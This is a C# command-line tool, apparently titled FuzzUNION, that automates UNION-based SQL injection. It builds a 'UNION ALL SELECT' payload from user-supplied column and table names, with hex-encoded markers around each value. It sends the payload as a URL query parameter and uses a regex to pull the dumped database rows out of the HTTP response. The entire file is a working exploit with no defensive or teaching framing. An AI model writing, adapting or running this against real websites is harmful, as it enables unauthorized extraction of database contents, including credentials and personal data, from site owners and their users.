using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace FuzzUNION
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string frontMarker = "FrOnTMaRker";
                string frontHex = string.Join("", frontMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));

                string url;
                string payload;
                List<string> lists = new List<string>();
                string[] Columns;

                try
                {
                    url = args[0];
                    int ColumnCount = Convert.ToInt32(args[1]);
                    Columns = args[2].Split(',');
                    string nullCount = setWord("NULL", ColumnCount - 1);
                    payload = string.Format("CONCAT(0x{0},{1})", 
                        frontHex, 
                        string.Join(',', Columns.AsEnumerable().Select(c => 
                        string.Format("IFNULL(CAST({0} AS CHAR),0x20),0x{1}", 
                        c, 
                        string.Join("", c.GetHashCode().ToString().ToCharArray().Select(d => ((int)d).ToString("X2"))))).ToList()));

                    payload = string.Format(
                        "fdsa' UNION ALL SELECT {0}{1} FROM {2}-- ",
                        nullCount, payload, args[3]);

                    url += string.Format("?{0}={1}", args[4], Uri.EscapeUriString(payload));
                    url += args.Length >= 6 ? args[5] : string.Empty;
                }
                catch (Exception)
                {
                    throw new Exception(string.Format("Usage: {0} URL ColumnCount Columns Table Method OtherMethod\n",
                        System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                }

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                string response = string.Empty;
                using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                    response = reader.ReadToEnd();

                Regex payloadRegex = new Regex(frontMarker + "(.*?)" + string.Join("(.*?)", Columns.Select(c => string.Format("{0}", c.GetHashCode()))));
                MatchCollection matches = payloadRegex.Matches(response);

                StringBuilder sb = new StringBuilder();
                foreach (Match match in matches)
                {
                    for (int i = 0; i < match.Groups.Count - 1; i++)
                    {
                        sb.AppendFormat("{0}: {1}\t", Columns[i], match.Groups[i + 1].Value);
                    }

                    sb.Append("\r\n");
                }

                if (sb.ToString() != string.Empty)
                    Console.WriteLine(sb.ToString());
                else
                    Console.WriteLine(response);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static string setWord(string word, int count)
        {
            StringBuilder ans = new StringBuilder();
            for (int i = 0; i < count; i++)
            {
                ans.AppendFormat("{0},", word);
            }

            return ans.ToString();
        }
    }
}
